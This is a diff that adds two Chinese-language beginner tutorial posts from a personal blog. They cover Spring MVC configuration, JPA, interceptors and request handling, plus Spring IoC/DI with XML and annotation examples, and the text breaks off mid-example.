@@ -236,6 +236,1626 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/23/Spring_mvc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/23/Spring_mvc/" itemprop="url">ssm基础之Spring MVC</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-23T08:15:41+08:00">
+                2019-01-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>跟着大佬的几篇文章学习了SpringMVC,记录一下。</p>
+</blockquote>
+<p>SpringMVC:<br>springmvc是一个基于mvc的web框架。</p>
+<h4 id="Spring-MVC基本配置"><a href="#Spring-MVC基本配置" class="headerlink" title="Spring MVC基本配置"></a>Spring MVC基本配置</h4><p>1.在web.xml配置入口Servlet    </p>
+<pre><code>&lt;servlet&gt;
+    &lt;servlet-name&gt;mvc-dispatcher&lt;/servlet-name&gt; 
+    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;
+    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
+  &lt;/servlet&gt;
+
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;mvc-dispatcher&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;    
+</code></pre><p>Servlet名字为:mvc-dispatcher   uri-pattern为/:拦截所有请求<br>2.SpringMVC的映射配置文件<br>在<code>mvc-dispatcher-servlet.xml</code>,配置SpringMVC的一些Controller的初始化,静态文件的映射策略,视图的配置等,这里只说下视图解析器的相关配置:        </p>
+<pre><code>&lt;!--ViewResolver 视图解析器--&gt;
+&lt;!--用于支持Servlet、JSP视图解析--&gt;
+&lt;bean id=&quot;jspViewResolver&quot; class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;
+    &lt;property name=&quot;viewClass&quot; value=&quot;org.springframework.web.servlet.view.JstlView&quot;/&gt;
+    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/pages/&quot;/&gt;
+    &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt;
+&lt;/bean&gt;
+</code></pre><p>在SpringMVC中,controller会返回一个字符串(jsp名字)。在jspViewResolver的2个属性分别为jsp文件的前缀(/WEB-INF/pages/)与后缀(.jsp),这样在controller里面,如果返回的字符串是index(<code>return &quot;index&quot;</code>),SpringMVC就会找到<code>/WEB-INF/pages/index.jsp</code>文件    </p>
+<p>3.Maven自动导入jar包<br> 既然我们做SpringMVC开发,肯定少不了相关的jar包,但是随着项目增大,原来那种下载包然后导入感觉太麻烦,现在使用Maven就变得简单了。    其实maven的工作原理简单理解就是自动将你需要的jar包下载到本地,然后关联到项目中,所有的包都存储在几个中央仓库里面,需要什么包,就取出什么包<br> pom.xml<br> 重点看<code>&lt;dependencies&gt;</code>标签，将对每个包的需求都看成一个依赖<code>&lt;depedency&gt;</code>,定义在<code>&lt;dependencies&gt;</code>中,在每个<code>&lt;dependencies&gt;</code>中,需要提供jar包的groupid,artifactId和version,我们引入一个junit包的格式:</p>
+<pre><code>  &lt;dependency&gt;
+    &lt;groupId&gt;junit&lt;/groupId&gt;
+    &lt;artifactId&gt;junit&lt;/artifactId&gt;
+    &lt;version&gt;3.8.1&lt;/version&gt;
+    &lt;scope&gt;test&lt;/scope&gt;
+&lt;/dependency&gt;
+</code></pre><p>要引入其他包,查询:<a href="https://mvnrepository.com/" target="_blank" rel="noopener">https://mvnrepository.com/</a><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-15.21.52.56-image.png" alt="2019-01-15.21.52.56-image.png"><br> 在pom.xml中填写<code>&lt;dependencies&gt;</code>标签的内容即可</p>
+<p>4.数据库配置<br>SpringMVC集成Spring Data JPA（由 Hibernate JPA 提供），来进行强大的数据库访问<br>在之前接触MVC模式中,数据库的一张表往往对应着一个JavaBean,在SpringMVC中,这个JavaBean就相当于model,且Idea会自动帮我们生成这些类<br>配置数据库有2种方法,由于刚开始学习,先使用较简单的,直接在<code>mvc-dispatcher-servlet.xml</code>中配置:    </p>
+<pre><code>&lt;bean id=&quot;entityManagerFactory&quot; class=&quot;org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean&quot;&gt;
+        &lt;property name=&quot;persistenceUnitName&quot; value=&quot;defaultPersistenceUnit&quot;/&gt;
+        &lt;property name=&quot;packagesToScan&quot; value=&quot;com.gaussic.model&quot; /&gt;
+        &lt;property name=&quot;jpaVendorAdapter&quot;&gt;
+            &lt;bean class=&quot;org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter&quot;/&gt;
+        &lt;/property&gt;
+        &lt;property name=&quot;jpaProperties&quot;&gt;
+            &lt;props&gt;
+                &lt;prop key=&quot;hibernate.connection.driver_class&quot;&gt;com.mysql.jdbc.Driver&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.connection.url&quot;&gt;jdbc:mysql://localhost:3306/springdemo?useSSL=false&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.connection.username&quot;&gt;root&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.connection.password&quot;&gt;111111&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.show_sql&quot;&gt;false&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.connection.useUnicode&quot;&gt;true&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.connection.characterEncoding&quot;&gt;UTF-8&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.format_sql&quot;&gt;true&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.use_sql_comments&quot;&gt;true&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.hbm2ddl.auto&quot;&gt;update&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.connection.autoReconnect&quot;&gt;true&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.dialect&quot;&gt;org.hibernate.dialect.MySQL5Dialect&lt;/prop&gt;
+            &lt;prop key=&quot;connection.autoReconnectForPools&quot;&gt;true&lt;/prop&gt;
+            &lt;prop key=&quot;connection.is-connection-validation-required&quot;&gt;true&lt;/prop&gt;
+
+            &lt;prop key=&quot;hibernate.c3p0.validate&quot;&gt;true&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.connection.provider_class&quot;&gt;org.hibernate.service.jdbc.connections.internal.C3P0ConnectionProvider&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.c3p0.min_size&quot;&gt;5&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.c3p0.max_size&quot;&gt;600&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.c3p0.timeout&quot;&gt;1800&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.c3p0.max_statements&quot;&gt;50&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.c3p0.preferredTestQuery&quot;&gt;SELECT 1;&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.c3p0.testConnectionOnCheckout&quot;&gt;true&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.c3p0.idle_test_period&quot;&gt;3000&lt;/prop&gt;
+        &lt;/props&gt;
+    &lt;/property&gt;
+&lt;/bean&gt;
+</code></pre><p>修改上面的连接信息,然后使用Persistence工具再进行配置<br>参考:<a href="https://my.oschina.net/gaussik/blog/513444" target="_blank" rel="noopener">https://my.oschina.net/gaussik/blog/513444</a></p>
+<p>5.JPA操作<br>JPA是Java Persistence API的简称,就是定义对数据库的操作。首先新建一个repository包,在repository包中的2个接口:UserRepository，BlogRepository并让其都继承JpaRepository。<br>在JpaRepository中定义了几个简化操作数据库的方法        </p>
+<pre><code>   findAll()：查找表中所有记录；
+findOne(Integer id)：按id来查找某一条记录
+findByXXX(Object xxx)：在这里XXX是一个字段名，根据该字段的值开查找所有记录；
+save()和delete()：添加一条记录以及删除一条记录
+</code></pre><p>除此之外,我们可以在该接口中定义新的方法,如项目中定义的更新用户信息的例子:</p>
+<pre><code>@Repository
+public interface UserRepository extends     JpaRepository&lt;UserEntity, Integer&gt; {
+
+@Modifying      // 说明该方法是修改操作
+@Transactional  // 说明该方法是事务性操作
+// 定义查询
+// @Param注解用于提取参数
+@Query(&quot;update UserEntity us set us.nickname=:qNickname, us.firstName=:qFirstName, us.lastName=:qLastName, us.password=:qPassword where us.id=:qId&quot;)
+public void updateUser(@Param(&quot;qNickname&quot;) String nickname, @Param(&quot;qFirstName&quot;) String firstName,
+                       @Param(&quot;qLastName&quot;) String qLastName, @Param(&quot;qPassword&quot;) String password, @Param(&quot;qId&quot;) Integer id);
+}
+</code></pre><p>然后在controller中使用以下语句更新即可</p>
+<pre><code>userRepository.updateUser(user.getNickname(), user.getFirstName(),
+                user.getLastName(), user.getPassword(), user.getId());
+userRepository.flush();   //刷新
+</code></pre><p>6.SpringMVC 拦截器<br>IndexInterceptor.java            </p>
+<pre><code>package com.interceptor;
+import java.util.Date;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+import org.springframework.web.servlet.ModelAndView;
+import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
+
+
+
+/*在业务处理器处理请求(controller)之前被调用
+false：从当前拦截器往回执行所有拦截器的afterCompletion()
+true:依次执行,直到preHandle都完成---&gt;controller--&gt;从最后一个往回执行postHandle()---&gt;从最后一个往回执行afterCompletion()*/
+
+
+public class IndexInterceptor extends HandlerInterceptorAdapter {
+
+public boolean preHandle(HttpServletRequest request,
+                             HttpServletResponse response, Object handler) throws Exception {
+
+    System.out.println(&quot;preHandle(), 在访问Controller之前被调用&quot;);
+    return true;
+
+}
+
+
+ //controller之后,view之前        
+public void postHandle(HttpServletRequest request,
+                       HttpServletResponse response, Object handler,
+                       ModelAndView modelAndView) throws Exception {
+    System.out.println(&quot;postHandle(), 在访问Controller之后，访问视图之前被调用,这里可以注入一个时间到modelAndView中，用于后续视图显示&quot;);
+    modelAndView.addObject(&quot;date&quot;,&quot;由拦截器生成的时间:&quot; + new Date());
+}
+
+ //view之后,用于清理资源    
+ public void afterCompletion(HttpServletRequest request,
+                            HttpServletResponse response, Object handler, Exception ex)
+        throws Exception {
+
+    System.out.println(&quot;afterCompletion(), 在访问视图之后被调用&quot;);
+}
+
+}
+</code></pre><p>多定义几个拦截器即可理解其执行顺序:<br>在浏览器访问localhost:8080/index时,控制台打印:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-18.09.59.30-image.png" alt="2019-01-18.09.59.30-image.png"></p>
+<h4 id="Spring-MVC请求流程"><a href="#Spring-MVC请求流程" class="headerlink" title="Spring MVC请求流程"></a>Spring MVC请求流程</h4><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-20.23.10.44-image.png" alt="2019-01-20.23.10.44-image.png"></p>
+<p>1.首先,请求离开浏览器后,第一步到达DispatcherServlet,拦截请求并发送给相应的Spring MVC控制器(DispatcherServlet的任务就是拦截请求并发给控制器)<br>2.处理器映射<br>处理器会根据请求携带的url来进行决策请求对应的控制器是哪个,我们配置控制simpleURLHandlerMapping将/hello地址交给helloController处理:</p>
+<pre><code>&lt;bean id=&quot;simpleUrlHandlerMapping&quot;
+      class=&quot;org.springframework.web.servlet.handler.SimpleUrlHandlerMapping&quot;&gt;
+    &lt;property name=&quot;mappings&quot;&gt;
+        &lt;props&gt;
+            &lt;!-- /hello 路径的请求交给 id 为 helloController 的控制器处理--&gt;
+            &lt;prop key=&quot;/hello&quot;&gt;helloController&lt;/prop&gt;
+        &lt;/props&gt;
+    &lt;/property&gt;
+&lt;/bean&gt;
+&lt;bean id=&quot;helloController&quot; class=&quot;controller.HelloController&quot;&gt;&lt;/bean&gt;
+</code></pre><p>也可以用注释:</p>
+<pre><code>@Controller
+public class HelloController{
+
+@RequestMapping(value = &quot;/hello&quot;, method = RequestMethod.GET)
+public String hello{
+    //处理逻辑
+    //返回视图名
+}
+</code></pre><p>用了注释就不需要在xml文件中指定controller了,不过需要加上<code>&lt;context:component-scan base-package=&quot;com.controller&quot;/&gt;</code><br>3.控制器处理好相关业务后,将需要返回的数据(Model)和用于渲染输出的视图名(Jsp)返回给DispatcherServlet            </p>
+<pre><code>public String getUsers(ModelMap modelMap) {
+
+    //处理逻辑
+
+    //返回模型数据
+    modelMap.addAttribute(&quot;userList&quot;, userList);
+
+    //返回用于渲染输出的视图名
+    return &quot;admin/users&quot;;
+}
+</code></pre><p>4.视图解析器            </p>
+<pre><code>&lt;bean id=&quot;viewResolver&quot;
+      class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;
+    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/page/&quot; /&gt;
+    &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;
+&lt;/bean&gt;
+</code></pre><p>这是一个Spring MVC内置的一个视图解析器,该解析器遵循:在controller中返回的视图名上添加前缀和后缀,进而确定一个web应用中视图资源的物理路径。上面的解析器说明需要返回目录webapp/WEB-INF/page/admin下的users.jsp文件                </p>
+<p>5.视图(users.jsp)<br>在视图文件中接收Controller返回的数据(Model)并用于展示    </p>
+<pre><code>&lt;c:forEach items=&quot;${userList}&quot; var=&quot;user&quot;&gt;
+    ${user.id}
+    ${user.nickname}
+    ${user.firstName} ${user.lastName}
+    ${user.password}
+&lt;/c:forEach&gt;
+</code></pre><h4 id="控制器接收请求数据"><a href="#控制器接收请求数据" class="headerlink" title="控制器接收请求数据"></a>控制器接收请求数据</h4><p>1.Servlet原生API        </p>
+<pre><code>@RequestMapping(value = &quot;/admin/login1&quot;, method = RequestMethod.POST)
+public  String loginp1(HttpServletRequest request, HttpServletResponse response){
+    String username1 = request.getParameter(&quot;username1&quot;);
+    String password1 = request.getParameter(&quot;password1&quot;);
+</code></pre><p>2.使用@RequestParam(“前台参数名”)</p>
+<pre><code>@RequestMapping(value = &quot;/admin/login3&quot;, method = RequestMethod.POST)
+public  String loginp3(@RequestParam(&quot;username&quot;) String username3, @RequestParam(&quot;password&quot;) String password3){
+
+    System.out.println(username3);
+    System.out.println(password3);
+    return null;
+}
+</code></pre><p>3.使用同名匹配规则        </p>
+<pre><code>@RequestMapping(value = &quot;/admin/login2&quot;, method = RequestMethod.POST)
+public  String loginp2(String username2,String password2){
+
+    System.out.println(username2);
+    System.out.println(password2);
+    return null;
+}
+</code></pre><p>4.使用模型(model)传参数<br>要求:前台参数名与模型字段名相同。            </p>
+<pre><code>User模型
+package pojo;
+
+public class User {
+
+    String userName;
+    String password;
+
+    /* getter and setter */
+}
+</code></pre><p>在控制器中使用:            </p>
+<pre><code>@RequestMapping(&quot;/login&quot;)
+public String get_(User user){
+    //user.getUsername();
+    //user.getPassword();
+}
+</code></pre><h4 id="中文乱码问题"><a href="#中文乱码问题" class="headerlink" title="中文乱码问题"></a>中文乱码问题</h4><p>同servlet一样,只对POST方法有效(因为直接处理的request)<br>通过配置SpringMVC的字符编码过滤器来完成,web.xml中添加</p>
+<pre><code>&lt;filter&gt;
+    &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt;
+    &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;
+    &lt;init-param&gt;
+        &lt;param-name&gt;encoding&lt;/param-name&gt;
+        &lt;!-- 设置编码格式 --&gt;
+        &lt;param-value&gt;utf-8&lt;/param-value&gt;
+    &lt;/init-param&gt;
+&lt;/filter&gt;
+&lt;filter-mapping&gt;
+    &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt;
+    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
+&lt;/filter-mapping&gt;
+</code></pre><h4 id="控制器回显数据"><a href="#控制器回显数据" class="headerlink" title="控制器回显数据"></a>控制器回显数据</h4><p>1.使用 Servlet 原生 API 来实现    </p>
+<pre><code>@RequestMapping(&quot;/value&quot;)
+public ModelAndView hand(HttpServletRequest request,                              
+HttpServletResponse response) {
+    request.setAttribute(&quot;message&quot;,&quot;成功！&quot;);
+    return new ModelAndView(&quot;test1&quot;);
+}
+</code></pre><p>2.使用 Spring MVC 所提供的 ModelAndView 对象</p>
+<pre><code>@RequestMapping(value = &quot;/admin/login&quot;, method = RequestMethod.GET)
+  public ModelAndView login(HttpRequest request, HttpResponse response){
+      ModelAndView mv = new ModelAndView(&quot;admin/login&quot;);
+      mv.addObject(&quot;message&quot;,&quot;测试&quot;);
+      return mv;
+  }
+</code></pre><p>3.使用 Model 对象(常用)            </p>
+<pre><code>session.setAttribute(&quot;count&quot;,i);
+modelMap.addAttribute(&quot;count&quot;,i);
+</code></pre><p>使用@ModelAttribute注解            </p>
+<pre><code>@ModelAttribute
+public void model(Model model) {
+    model.addAttribute(&quot;message&quot;, &quot;注解成功&quot;);
+}
+
+@RequestMapping(&quot;/value&quot;)
+public String handleRequest() {
+    return &quot;test1&quot;;
+}
+</code></pre><p>这样程序就会在调用该控制器所有的方法前,调用model()方法将message添加到页面参数中去,在视图中可直接调用。</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h4><p><a href="https://my.oschina.net/gaussik/blog/385697" target="_blank" rel="noopener">https://my.oschina.net/gaussik/blog/385697</a><br><a href="http://how2j.cn/k/springmvc/springmvc-springmvc/615.html" target="_blank" rel="noopener">http://how2j.cn/k/springmvc/springmvc-springmvc/615.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/10/ssm基础之Spring/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/10/ssm基础之Spring/" itemprop="url">ssm基础之Spring</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-10T08:15:41+08:00">
+                2019-01-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>早几天就将Java Web的实验收尾了,项目代码(简易论坛)已经上传到Github了,没事儿看看ssm框架,争取早日撸个商城出来。</p>
+</blockquote>
+<hr>
+<p><a href="https://github.com/P0rZ9/Java_Web/tree/master/Java_Web_BBS" target="_blank" rel="noopener">Java_Web_Bbs项目地址</a></p>
+<p>SSM <strong>(Spring+SpringMVC+MyBatis)</strong> 框架集由Spring、MyBatis两个开源框架整合而成（SpringMVC是Spring中的部分内容）。常作为数据源较简单的web项目的框架。先了解一波Spring。</p>
+<blockquote>
+<p>Spring是一个开源框架，主要是为了解决项目开发中的紧耦合的问题，采用了控制反转和AOP技术简化了企业级应用的开发，让开发者能够更专注于业务的开发，减少了流程式的代码，简化了开发过程，所以受到开发人员的欢迎。</p>
+</blockquote>
+<h2 id="IOC-DI-控制反转-依赖注入"><a href="#IOC-DI-控制反转-依赖注入" class="headerlink" title="IOC/DI 控制反转/依赖注入"></a>IOC/DI 控制反转/依赖注入</h2><blockquote>
+<p>在java开发中，如果要使用另外一个类的定义的功能，譬如在A类中需要调用B类的方法，那么一般的做法就是在A类中实例化一个B的对象,通过A.b.method()这样的方式来调用，那么这样造成了什么后果呢？那就是A强烈的依赖于B，这个时候就要求B中方法保持稳定，不能随意变动。这个时候B中的代码就被A给“限制”了，如果这个时候你要修改B中的方法，譬如将method()改为methodA()，那么同时也就要修改A中的代码以适应这个改变，这样的程序改动起来很大，也就是说扩展性很低。<br>控制反转就是为了解决这类问题所提出来的一种概念，主要就是通过一个容器来管理对象之间的依赖关系，Spring就提供了这样的一个容器来管理对象之间的依赖。就以上面的场景来说，A需要用到B中的功能，A只需要向容器提出我需要包含xx功能的对象，容器就能给你一个这样的对象，至于这个对象到底是不是B？你管那么多呢？只要能用就行对吧。<br>Spring中提供的这样的容器就是我们经常提到的ApplicationContext。</p>
+</blockquote>
+<h2 id="AOP-Aspect-Oriented-Program-面向切面编程"><a href="#AOP-Aspect-Oriented-Program-面向切面编程" class="headerlink" title="AOP(Aspect Oriented Program)面向切面编程"></a>AOP(Aspect Oriented Program)面向切面编程</h2><blockquote>
+<p>在开发中，经常会遇到相同的模块，例如打印日志，安全管理这样的功能，可能每一个类都会有这样的需要。譬如我要记录每一个类的调用记录，使用参数等信息，这种功能k可以在每个类中加入相似的代码，直接打印出来就好。但是这种方法将辅助性的功能放到实际业务里去实现了，使每个方法承担的使命太多，如果能狗自动打印日志，不是更好吗？而这种通用的功能就称之为一个切面，面向切面的编程能够简化开发的实际代码，更好的关注于业务本身。</p>
+</blockquote>
+<h3 id="演示IOC-反转控制-和DI-依赖注入"><a href="#演示IOC-反转控制-和DI-依赖注入" class="headerlink" title="演示IOC(反转控制)和DI(依赖注入)"></a>演示IOC(反转控制)和DI(依赖注入)</h3><h4 id="运行TestSpring演示用Spring获取一个对象-并打印name"><a href="#运行TestSpring演示用Spring获取一个对象-并打印name" class="headerlink" title="运行TestSpring演示用Spring获取一个对象,并打印name"></a>运行TestSpring演示用Spring获取一个对象,并打印name</h4><p>1.<strong>Eclipse新建项目(Java Project),项目名字spring</strong><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.11.02.18-image.png" alt="2019-01-10.11.02.18-image.png"></p>
+<p>2.<strong>下载项目所需的jar包,并导入项目中(Build Path—&gt;Add Externam JARs)</strong><br><a href="http://how2j.cn/frontdownload?bean.id=1484" target="_blank" rel="noopener">Jar包下载</a>,导入后:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.11.03.44-image.png" alt="2019-01-10.11.03.44-image.png"></p>
+<p>3.<strong>pojo</strong><br>准备pojo Source类    </p>
+<pre><code>package pojo;
+
+public class Source {
+     private int id;
+    private String name;
+
+    public int getId() {
+        return id;
+    }
+    public void setId(int id) {
+        this.id = id;
+    }
+    public String getName() {
+        return name;
+    }
+    public void setName(String name) {
+        this.name = name;
+    }  
+}
+</code></pre><p><strong>4.applicationContext.xml</strong><br>在src目录下新建applicationContext.xml,这是Spring的核心配置文件,通过关键字s获取Source对象,该对象获取的时候,即被注入了字符串”test1”到name属性,数值1到id属性中。    </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;beans         
+xmlns=&quot;http://www.springframework.org/schema/beans&quot;
+xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;
+xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;
+        xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
+xsi:schemaLocation=&quot;
+   http://www.springframework.org/schema/beans
+   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
+ http://www.springframework.org/schema/aop
+ http://www.springframework.org/schema/aop/spring-aop-3.0.xsd
+ http://www.springframework.org/schema/tx
+ http://www.springframework.org/schema/tx/spring-tx-3.0.xsd
+ http://www.springframework.org/schema/context     
+ http://www.springframework.org/schema/context/spring-context-3.0.xsd&quot;&gt;
+
+&lt;bean name=&quot;s&quot; class=&quot;pojo.Source&quot;&gt;
+    &lt;property name=&quot;name&quot; value=&quot;test1&quot; /&gt;
+    &lt;property name=&quot;id&quot; value=&quot;1&quot; /&gt;
+&lt;/bean&gt;
+</code></pre><p></p>
+<p><strong>5.TestSpring</strong><br>测试代码,演示通过spring获取Source对象,以及该对象被注入的name属性。如图所示,打印通过Spring拿到的Source对象的name与id属性。    </p>
+<pre><code>package test;
+
+import org.springframework.context.ApplicationContext;
+import org.springframework.context.support.ClassPathXmlApplicationContext;
+import pojo.Source;
+
+public class TestSpring {
+public static void main(String[] args) {
+    ApplicationContext context = new ClassPathXmlApplicationContext(
+            new String[] { &quot;applicationContext.xml&quot; });
+
+    Source s = (Source) context.getBean(&quot;s&quot;);
+
+    System.out.println(s.getName());
+    System.out.println(s.getId());
+    }
+}
+</code></pre><p>运行结果:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.11.18.44-image.png" alt="2019-01-10.11.18.44-image.png">    </p>
+<p><strong>6.原理图</strong><br>获取对象的方式比较:<br>传统:<code>Source s = new Source();</code><br>IOC:<code>Source s = (Source) context.getBean(&quot;s&quot;);</code><br>对象的声明周期由Spring来管理,直接从Spring那里去获取一个对象,IOC是控制反转(Inversion Of Control)的缩写,控制权交给了Spring。    </p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.11.22.29-image.png" alt="2019-01-10.11.22.29-image.png"></p>
+<hr>
+<p>上面第一个例子演示了注入对象的属性,下面演示注入Source对象</p>
+<h4 id="向Product注入Source对象"><a href="#向Product注入Source对象" class="headerlink" title="向Product注入Source对象"></a>向Product注入Source对象</h4><p>1.Product.java    </p>
+<pre><code>package pojo;
+
+public class Product {
+    private int id;
+    public int getId() {
+        return id;
+    }
+    public void setId(int id) {
+        this.id = id;
+    }
+    public String getName() {
+        return name;
+    }
+    public void setName(String name) {
+        this.name = name;
+    }
+    public Source getSource() {
+        return source;
+    }
+    public void setSource(Source source) {
+        this.source = source;
+    }
+    private String name;
+    private Source source;
+}
+</code></pre><p>2.applicationContext.xml(关键) 在创建Product的时候注入一个Source对象(使用ref来注入另一个对象)        </p>
+<pre><code>&lt;bean name=&quot;s&quot; class=&quot;pojo.Source&quot;&gt;
+    &lt;property name=&quot;name&quot; value=&quot;test1&quot; /&gt;
+    &lt;property name=&quot;id&quot; value=&quot;1&quot; /&gt;
+&lt;/bean&gt;
+
+&lt;bean name=&quot;p&quot; class=&quot;pojo.Product&quot;&gt;
+    &lt;property name=&quot;name&quot; value=&quot;product1&quot; /&gt;
+    &lt;property name=&quot;source&quot; ref=&quot;s&quot; /&gt;
+&lt;/bean&gt;
+</code></pre><p>3.TestSpring.java    </p>
+<pre><code>package test;
+
+import org.springframework.context.ApplicationContext;
+import org.springframework.context.support.ClassPathXmlApplicationContext;
+
+import pojo.Source;
+import pojo.Product;
+
+public class TestSpring {
+
+    public static void main(String[] args) {
+        ApplicationContext context = new ClassPathXmlApplicationContext(
+                new String[] { &quot;applicationContext.xml&quot; });
+
+        //Source s = (Source) context.getBean(&quot;s&quot;);
+        Product p = (Product) context.getBean(&quot;p&quot;); 
+
+        System.out.println(p.getName());
+        System.out.println(p.getSource().getName());
+
+    }
+}
+</code></pre><p>通过Spring拿到的Product对象已经被注入了Source对象<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.11.41.51-image.png" alt="2019-01-10.11.41.51-image.png"></p>
+<h4 id="注解方式演示IOC-DI-对注入对象的注解"><a href="#注解方式演示IOC-DI-对注入对象的注解" class="headerlink" title="注解方式演示IOC/DI(对注入对象的注解)"></a>注解方式演示IOC/DI(对注入对象的注解)</h4><p>1.修改applicationContext.xml    </p>
+<pre><code>&lt;context:annotation-config/&gt;  
+ &lt;bean name=&quot;s&quot; class=&quot;pojo.Source&quot;&gt;
+     &lt;property name=&quot;name&quot; value=&quot;test1&quot; /&gt;
+ &lt;/bean&gt;
+ &lt;bean name=&quot;p&quot; class=&quot;pojo.Product&quot;&gt;
+     &lt;property name=&quot;name&quot; value=&quot;product1&quot; /&gt;
+ &lt;/bean&gt;
+</code></pre><p>2.在Product.java中,在定义对象前加<code>@Autowired</code></p>
+<pre><code>@Autowired
+private Source source;
+</code></pre><p>也可以在setSource(Source source)前面添加    </p>
+<pre><code>@Autowired
+public void setSource(Source source) {
+    this.source = source;
+}
+</code></pre><p>也可以在</p>
+<pre><code>@Resource(name=&quot;s&quot;)
+private Source source;
+</code></pre><h4 id="对Bean本身的注解"><a href="#对Bean本身的注解" class="headerlink" title="对Bean本身的注解"></a>对Bean本身的注解</h4><p>1.修改applicationContext.xml,只新增:</p>
+<pre><code>&lt;context:component-scan base-package=&quot;pojo&quot;/&gt;
